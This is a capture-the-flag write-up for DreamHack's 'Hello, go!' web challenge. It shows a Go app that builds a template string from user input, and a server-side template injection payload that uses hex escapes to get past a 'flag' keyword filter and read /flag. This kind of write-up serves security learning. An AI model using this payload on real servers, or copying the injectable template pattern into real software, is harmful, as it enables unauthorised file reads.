# Hello, go! — DreamHack

> **Room / Challenge:** Hello, go! (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Hello, go! (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1999`
- **Level:** `2`
- **Date:** `20-11-2025`

---

## Goal

Leveraging SSTI in Go template and get the flag.

## My Solution

The `app.go` has a vulnerable code in how it renders our input:

```go
t, err := template.New("page").Parse(
fmt.Sprintf(`
    <html>
    <body>
        <h1>Hello, %s!</h1>
    </body>
    </html>`, name))
```

The server gets our input and render it to the template, then it executes:

```go
err = t.Execute(buf, c)
```

However, there is a filter bypass:

```go
if strings.Contains(strings.ToLower(name),"flag"){ ... }
```

Here we cannot use direct `flag`, so I use Hex representations:

```
/ -> \x2f

f -> \x66

l -> \x6c

a -> \x61

g -> \x67
```

`/flag` becomes `\x2f\x66\x6c\x61\x67`. Final payload:

```go
{{ .File "\x2f\x66\x6c\x61\x67" }}
```

![Guide image](./screenshots/1.png)
